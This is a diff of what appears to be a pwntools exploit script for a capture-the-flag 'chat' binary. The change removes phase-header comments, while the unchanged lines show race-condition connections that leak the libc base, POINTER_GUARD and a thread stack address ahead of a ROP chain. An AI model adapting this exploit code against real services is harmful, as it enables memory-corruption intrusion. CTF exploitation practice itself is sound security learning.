@@ -36,10 +36,7 @@ def recv_msg(p):
 
     return name, msg
 
-#############################
-### Phase 1: Race to leak ###
-#############################
-# Race condition
+
 p = process("./chat")
 p1 = remote(IP, PORT)
 p2 = remote(IP, PORT)
@@ -85,10 +82,8 @@ info("Libc base: " + hex(libc.address))
 pointer_guard = u64(msg[0x9d0:0x9d8])
 info("POINTER_GUARD: " + hex(pointer_guard))
 
-################################
-### Phase 2: Prepare gadgets ###
-################################
-# Race condition
+
+
 p1 = remote(IP, PORT)
 p2 = remote(IP, PORT)
 
@@ -119,9 +114,7 @@ p.close()
 thread2_stack_leak = u64(msg[0x160:0x168])
 info("Thread stack leak: " + hex(thread2_stack_leak))
 
-############################
-### Phase 3: ROPChaining ###
-############################
+
 # Try to race to write data
 p1 = remote(IP, PORT)
 p2 = remote(IP, PORT)
